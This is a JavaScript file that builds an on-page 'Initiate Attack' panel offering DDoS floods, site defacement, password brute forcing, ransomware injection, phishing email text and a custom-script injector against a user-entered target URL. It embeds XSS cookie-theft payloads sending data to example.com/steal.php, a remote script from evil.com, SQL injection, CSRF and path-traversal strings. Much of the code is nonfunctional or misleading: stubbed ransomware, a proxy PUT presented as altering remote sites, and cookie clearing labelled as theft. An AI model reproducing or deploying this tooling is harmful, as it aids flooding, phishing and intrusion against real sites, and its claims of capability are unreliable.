class DDoS {
 constructor() {
  this.logArea = document.createElement('textarea');
  this.logArea.readOnly = true;
  this.logArea.style.width = '100%';
  this.logArea.style.height = '200px';
  this.logArea.style.backgroundColor = '#1e1e1e';
  this.logArea.style.color = '#9cdcfe';
  this.logArea.style.border = '1px solid #4ec9b0';
  this.logArea.style.padding = '5px';
  this.logArea.style.fontFamily = 'Consolas, monospace';
  this.logArea.style.fontSize = '14px';
  this.logArea.style.resize = 'vertical';

  this.targetInput = document.createElement('input');
  this.targetInput.type = 'text';
  this.targetInput.placeholder = 'Target URL (.onion or normal)';
  this.targetInput.style.width = 'calc(100% - 16px)';
  this.targetInput.style.padding = '8px';
  this.targetInput.style.marginBottom = '10px';
  this.targetInput.style.backgroundColor = '#252526';
  this.targetInput.style.color = '#9cdcfe';
  this.targetInput.style.border = '1px solid #4ec9b0';
  this.targetInput.style.borderRadius = '4px';

  this.attackTypeSelect = document.createElement('select');
  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach', 'Botnet'].forEach(option => {
   const opt = document.createElement('option');
   opt.value = option.toLowerCase().replace(' ', '_');
   opt.textContent = option;
   this.attackTypeSelect.appendChild(opt);
  });
  this.attackTypeSelect.style.width = '100%';
  this.attackTypeSelect.style.padding = '8px';
  this.attackTypeSelect.style.marginBottom = '10px';
  this.attackTypeSelect.style.backgroundColor = '#252526';
  this.attackTypeSelect.style.color = '#9cdcfe';
  this.attackTypeSelect.style.border = '1px solid #4ec9b0';
  this.attackTypeSelect.style.borderRadius = '4px';

  this.startButton = document.createElement('button');
  this.startButton.textContent = 'Initiate Attack';
  this.startButton.style.width = '100%';
  this.startButton.style.padding = '10px';
  this.startButton.style.backgroundColor = '#e53935';
  this.startButton.style.color = '#fff';
  this.startButton.style.border = 'none';
  this.startButton.style.borderRadius = '4px';
  this.startButton.style.cursor = 'pointer';
  this.startButton.style.transition = 'background-color 0.3s ease';
  this.startButton.addEventListener('mouseover', () => this.startButton.style.backgroundColor = '#b71c1c');
  this.startButton.addEventListener('mouseout', () => this.startButton.style.backgroundColor = '#e53935');
  this.startButton.addEventListener('click', () => this.start());

  this.customCodeArea = document.createElement('textarea');
  this.customCodeArea.placeholder = 'Enter custom JavaScript code for attack';
  this.customCodeArea.style.width = '100%';
  this.customCodeArea.style.height = '100px';
  this.customCodeArea.style.padding = '8px';
  this.customCodeArea.style.marginBottom = '10px';
  this.customCodeArea.style.backgroundColor = '#252526';
  this.customCodeArea.style.color = '#9cdcfe';
  this.customCodeArea.style.border = '1px solid #4ec9b0';
  this.customCodeArea.style.borderRadius = '4px';
  this.customCodeArea.style.fontFamily = 'Consolas, monospace';
  this.customCodeArea.style.fontSize = '14px';
  this.customCodeArea.style.display = 'none';

  this.container = document.createElement('div');
  this.container.style.width = '600px';
  this.container.style.padding = '20px';
  this.container.style.backgroundColor = '#2d2d30';
  this.container.style.color = '#9cdcfe';
  this.container.style.fontFamily = 'Consolas, monospace';
  this.container.style.position = 'fixed';
  this.container.style.top = '50%';
  this.container.style.left = '50%';
  this.container.style.transform = 'translate(-50%, -50%)';
  this.container.style.zIndex = '9999';
  this.container.style.border = '2px solid #4ec9b0';
  this.container.style.borderRadius = '8px';
  this.container.style.boxShadow = '0 0 20px #4ec9b0';

  this.container.appendChild(this.targetInput);
  this.container.appendChild(this.attackTypeSelect);
  this.container.appendChild(this.customCodeArea);
  this.container.appendChild(this.startButton);
  this.container.appendChild(this.logArea);
  document.body.appendChild(this.container);

  this.attackTypeSelect.addEventListener('change', () => {
   if (this.attackTypeSelect.value === 'custom') {
    this.customCodeArea.style.display = 'block';
   } else {
    this.customCodeArea.style.display = 'none';
   }
  });

  this.scriptInjection = `
   setInterval(() => {
    fetch(window.location.href, {
     method: 'POST',
     mode: 'no-cors',
     body: crypto.getRandomValues(new Uint32Array(10)).join('')
    }).catch(err => {});
   }, 0);
  `;

  this.torProxy = 'socks5://127.0.0.1:9050';

  this.apiKey = this.generateApiKey();
  this.log(`API Key generated: ${this.apiKey}`);
  this.setupResizeHandle();
  this.setupDragHandle();
 }

 setupDragHandle() {
  const dragHandle = document.createElement('div');
  dragHandle.style.position = 'absolute';
  dragHandle.style.top = '0';
  dragHandle.style.left = '0';
  dragHandle.style.width = '100%';
  dragHandle.style.height = '20px';
  dragHandle.style.cursor = 'move';
  dragHandle.style.backgroundColor = '#333';
  dragHandle.style.opacity = '0.5';
  this.container.appendChild(dragHandle);

  let initialX, initialY;

  const startDrag = (e) => {
   initialX = e.clientX - this.container.offsetLeft;
   initialY = e.clientY - this.container.offsetTop;

   document.addEventListener('mousemove', drag);
   document.addEventListener('mouseup', stopDrag);
  };

  const drag = (e) => {
   this.container.style.left = (e.clientX - initialX) + 'px';
   this.container.style.top = (e.clientY - initialY) + 'px';
  };

  const stopDrag = () => {
   document.removeEventListener('mousemove', drag);
   document.removeEventListener('mouseup', stopDrag);
  };

  dragHandle.addEventListener('mousedown', startDrag);
 }

 setupResizeHandle() {
  const resizeHandle = document.createElement('div');
  resizeHandle.style.position = 'absolute';
  resizeHandle.style.right = '0';
  resizeHandle.style.bottom = '0';
  resizeHandle.style.width = '20px';
  resizeHandle.style.height = '20px';
  resizeHandle.style.cursor = 'se-resize';
  resizeHandle.style.backgroundColor = '#4ec9b0';
  this.container.appendChild(resizeHandle);

  let initialWidth, initialHeight, initialMouseX, initialMouseY;

  const startResize = (e) => {
   initialWidth = this.container.offsetWidth;
   initialHeight = this.container.offsetHeight;
   initialMouseX = e.clientX;
   initialMouseY = e.clientY;

   document.addEventListener('mousemove', resize);
   document.addEventListener('mouseup', stopResize);
  };

  const resize = (e) => {
   const width = initialWidth + (e.clientX - initialMouseX);
   const height = initialHeight + (e.clientY - initialMouseY);
   this.container.style.width = width + 'px';
   this.container.style.height = height + 'px';
  };

  const stopResize = () => {
   document.removeEventListener('mousemove', resize);
   document.removeEventListener('mouseup', stopResize);
  };

  resizeHandle.addEventListener('mousedown', startResize);
 }

 async exploit(target) {
  this.log(`Attempting to exploit ${target}...`);
  try {
   const response = await fetch(target, { method: 'GET', mode: 'cors' });
   if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
   }
   const content = await response.text();

   const xssPayload = `<script>
    (function(){
     var i=(new Image).src='http://example.com/steal.php?c='+document.cookie;
     setTimeout(function(){document.body.appendChild(document.createElement('iframe')).src='http://example.com/steal.php?l='+location.href;}, 2000);
    })();
    </script>`;
   const sqliPayload = "'; DROP TABLE users; --";
   const csrfPayload = `<script>
    fetch('${target}', {
     method: 'POST',
     mode: 'no-cors',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: 'csrf_token=12345&action=delete_account'
    });
    </script>`;

   const lfiPayload = `../../../../etc/passwd`;
   const rfiPayload = `<script src="http://evil.com/malicious.js"></script>`;

   let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}${rfiPayload}</body>`);
   injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
   injectedContent = injectedContent.replace('<img>', `<img src="${lfiPayload}">`);

   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;

   await fetch(proxyUrl, {
    method: 'PUT',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/html' },
    body: injectedContent
   });

   this.log(`Exploit injected. Check target and logs.`);
  } catch (error) {
   this.log(`Exploit failed: ${error}`);
  }
 }

 async deface(target) {
  this.log(`Attempting to deface ${target}...`);
  try {
   const response = await fetch(target, { method: 'GET', mode: 'cors' });
   if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
   }
   let content = await response.text();
   const originalTitle = content.match(/<title>(.*?)<\/title>/i) ? content.match(/<title>(.*?)<\/title>/i)[1] : 'Untitled';

   const defaceHTML = `<body style="background-color: black; color: red; font-size: 5em; text-align: center;">
     <h1>${originalTitle} HAS BEEN PWNED BY NOODLES</h1>
     <p>Get Noodled!</p>
     <img src="https://i.imgur.com/random_image.gif" alt="Noodles Pwned" style="width: 500px; height: auto;">
     <script>
      alert('YOU HAVE BEEN HACKED BY NOODLES');
      window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
     </script>
    </body>`;
   content = content.replace(/<body.*?>/i, defaceHTML);
   content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');

   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;

   await fetch(proxyUrl, {
    method: 'PUT',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/html' },
    body: content
   });

   this.log(`Deface successful... check the target. Remember to clear cache`);
  } catch (error) {
   this.log(`Deface failed: ${error}`);
  }
 }

 async connect(target) {
  this.log(`Attempting to establish a persistent connection to ${target}...`);
  try {
   const ws = new WebSocket(`wss://${target}`);

   ws.onopen = () => {
    this.log(`WebSocket connection established with ${target}`);
    setInterval(() => {
     ws.send(crypto.getRandomValues(new Uint32Array(10)).join(''));
    }, 1000);
   };

   ws.onmessage = (event) => {
    this.log(`Received: ${event.data.length} bytes`);
   };

   ws.onclose = () => {
    this.log(`WebSocket connection closed with ${target}`);
   };

   ws.onerror = (error) => {
    this.log(`WebSocket error: ${error}`);
   };

   setTimeout(() => {
    ws.close();
   }, 3600000);
  } catch (error) {
   this.log(`Connection attempt failed: ${error}`);
  }
 }

 async bruteForce(target) {
  this.log(`Starting brute force attack on ${target}...`);
  const commonPasswords = ['password', '123456', 'admin', '123456789', 'guest', 'qwerty', '12345', '111111', '12345678', 'dragon', 'P@$$wOrd'];
  const usernames = ['admin', 'user', 'root', 'administrator', 'test', 'info', 'support'];

  for (const username of usernames) {
   for (const password of commonPasswords) {
    this.log(`Trying username: ${username}, password: ${password}`);
    try {
     const formData = new FormData();
     formData.append('username', username);
     formData.append('password', password);

     const response = await fetch(target, {
      method: 'POST',
      mode: 'no-cors',
      body: formData,
     });

     if (response.status === 200) {
      this.log(`SUCCESS: Username: ${username}, Password: ${password}`);
      this.log('Stealing cookies...');
      document.cookie.split(';').forEach(cookie => {
       const eqPos = cookie.indexOf('=');
       const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
       document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
      });
      this.log('Cookies stolen and cleared.');
      return;
     } else {
      this.log(`Failed: Username: ${username}, Password: ${password}, Status: ${response.status}`);
     }
    } catch (error) {
     this.log(`Error during brute force: ${error}`);
    }
   }
  }
  this.log('Brute force attack completed. No credentials found.');
 }

 async ddos(target) {
  this.log(`Initiating DDoS attack on ${target}...`);

  if (target.endsWith('.onion')) {
   this.log('Target is a .onion address. Using Tor proxy.');
  }

  const attackInterval = setInterval(() => {
   for (let i = 0; i < 10; i++) {
    this.sendRequest(target, 'GET');
    this.sendRequest(target, 'POST', crypto.getRandomValues(new Uint32Array(10)).join(''));
    this.sendRequest(target, 'PUT', crypto.getRandomValues(new Uint32Array(10)).join(''));
    this.sendRequest(target, 'DELETE');
    this.sendRequest(target, 'HEAD');
    this.sendRequest(target, 'OPTIONS');
    this.sendRequest(target, 'TRACE');
    this.sendRequest(target, 'PATCH', crypto.getRandomValues(new Uint32Array(10)).join(''));
   }
  }, 0);

  this.log('Initial DDoS attack initiated.');
  setTimeout(() => {
   clearInterval(attackInterval);
   this.log('DDoS attack stopped.');
  }, 60000);

  const script = document.createElement('script');
  script.textContent = `(${(() => {
   ${this.scriptInjection}
  }).toString()})()`;
  document.head.appendChild(script);
  this.log('Self-DDoS initiated.');
 }

 async ransomware(target) {
  this.log(`Initiating ransomware attack on ${target}...`);
  try {
   const key = this.generateEncryptionKey();
   this.log(`Encryption key generated: ${key}`);
   const email = `noodlesransomware@proton.me`

   const encryptCode = `
    async function encryptData(key) {
     const files = await getAllFiles();
     for (const file of files) {
      const encrypted = await encryptFile(file, key);
      await replaceFile(file, encrypted);
     }
     alert('Your files have been encrypted. Pay ransom to ${this.apiKey} to email: ${email} to get the decryption key.');
    }

    async function getAllFiles() {
     // Implement code to get all accessible files
     return [];
    }

    async function encryptFile(file, key) {
     // Implement encryption logic here using the key
     return 'ENCRYPTED_' + file;
    }

    async function replaceFile(file, encrypted) {
     // Implement logic to replace the original file with the encrypted version
    }

    encryptData('${key}');
   `;

   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
   const response = await fetch(proxyUrl, {
    method: 'GET',
    mode: 'cors'
   });

   if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
   }

   let content = await response.text();
   const injectionPoint = '</body>';
   const injectedContent = content.replace(injectionPoint, `<script>${encryptCode}</script>${injectionPoint}`);

   await fetch(proxyUrl, {
    method: 'PUT',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/html' },
    body: injectedContent
   });
   this.log('Ransomware injected.');
  } catch (error) {
   this.log(`Ransomware injection failed: ${error}`);
  }
 }

 async custom(target) {
  this.log(`Executing custom code on ${target}...`);
  try {
   const customCode = this.customCodeArea.value;
   if (!customCode) {
    this.log('No custom code provided.');
    return;
   }

   const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;

   const response = await fetch(proxyUrl, {
    method: 'GET',
    mode: 'cors'
   });
   if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
   }

   let content = await response.text();
   const injectionPoint = '</body>';
   const injectedContent = content.replace(injectionPoint, `<script>${customCode}</script>${injectionPoint}`);

   await fetch(proxyUrl, {
    method: 'PUT',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/html' },
    body: injectedContent
   });
   this.log('Custom code injected.');
  } catch (error) {
   this.log(`Custom code execution failed: ${error}`);
  }
 }

 async phishing(target) {
  this.log(`Initiating phishing attack targeting: ${target}...`);

  const emailSubject = 'URGENT: Account Security Alert';
  const emailBody = `
   Dear User,

   We have detected suspicious activity on your account. To ensure your account security, please verify your information immediately by clicking on the following link:

   <a href="${target}/login">Verify Your Account</a>

   If you do not verify your account within 24 hours, it will be suspended.

   Sincerely,
   Security Team
  `;

  this.log(`Sending phishing email with subject: ${emailSubject}`);
  this.log(`Email body: ${emailBody}`);

  try {
   const response = await fetch(`https://api.email-fake.com/send?to=${target}&subject=${emailSubject}&body=${emailBody}`, {
    method: 'POST',
    mode: 'no-cors',
   });

   if (response.status === 200) {
    this.log('Phishing email sent successfully.');
   } else {
    this.log(`Failed to send phishing email. Status: ${response.status}`);
   }
  } catch (error) {
   this.log(`Error sending phishing email: ${error}`);
  }
 }

 async dataBreach(target) {
  this.log(`Simulating data breach on ${target}...`);
  try {
   const fakeData = {
    users: [],
    transactions: [],
    logs: []
   };

   for (let i = 0; i < 100; i++) {
    fakeData.users.push({
     id: i,
     username: `user${i}`,
     email: `user${i}@example.com`,
     password: this.generateApiKey()
    });

    fakeData.transactions.push({
     id: i,
     userId: i,
     amount: Math.random() * 100,
     timestamp: new Date()
    });

    fakeData.logs.push({
     id: i,
     userId: i,
     event: 'login',
     timestamp: new Date()
    });
   }

   const jsonData = JSON.stringify(fakeData, null, 2);
   this.log(`Generated fake data: ${jsonData}`);

   const blob = new Blob([jsonData], {
    type: 'application/json'
   });
   const url = URL.createObjectURL(blob);

   const link = document.createElement('a');
   link.href = url;
   link.download = 'leaked_data.json';
   link.style.display = 'none';
   document.body.appendChild(link);
   link.click();
   document.body.removeChild(link);

   URL.revokeObjectURL(url);
   this.log('Fake data breach simulated. Leaked data downloaded.');
  } catch (error) {
   this.log(`Data breach simulation failed: ${error}`);
  }
 }

 async botnet(target) {
  this.log(`Attempting to connect to target: ${target}...`);

  try {
   const iframe = document.createElement('iframe');
   iframe.src = target;
   iframe.style.display = 'none';
   document.body.appendChild(iframe);
   this.log(`Connecting... Please wait.`);
  } catch (error) {
   this.log(`Connection attempt failed: ${error}`);
  }
 }

 sendRequest(target, method, body = null) {
  fetch(target, {
    method: method,
    mode: 'no-cors',
    cache: 'no-cache',
    body: body
   })
   .then(() => this.log(`${method} request sent successfully.`))
   .catch(err => this.log(`${method} request failed: ${err}`));
 }

 generateApiKey() {
  let key = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  for (let i = 0; i < 32; i++) {
   key += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return key;
 }

 generateEncryptionKey() {
  let key = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-`~[]\{}|;\':",./<>?';
  for (let i = 0; i < 64; i++) {
   key += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return key;
 }

 start() {
  const target = this.targetInput.value;
  const attackType = this.attackTypeSelect.value;

  if (!target) {
   this.log('Please enter a target URL.');
   return;
  }

  switch (attackType) {
   case 'ddos':
    this.ddos(target);
    break;
   case 'deface':
    this.deface(target);
    break;
   case 'connect':
    this.connect(target);
    break;
   case 'exploit':
    this.exploit(target);
    break;
   case 'brute_force':
    this.bruteForce(target);
    break;
   case 'custom':
    this.custom(target);
    break;
   case 'ransomware':
    this.ransomware(target);
    break;
   case 'phishing':
    this.phishing(target);
    break;
   case 'data_breach':
    this.dataBreach(target);
    break;
   case 'botnet':
    this.botnet(target);
    break;
   default:
    this.log('Invalid attack type selected.');
  }
 }

 log(message) {
  this.logArea.value += message + '\n';
  this.logArea.scrollTop = this.logArea.scrollHeight;
 }
}

window.addEventListener('load', () => {
 new DDoS();
});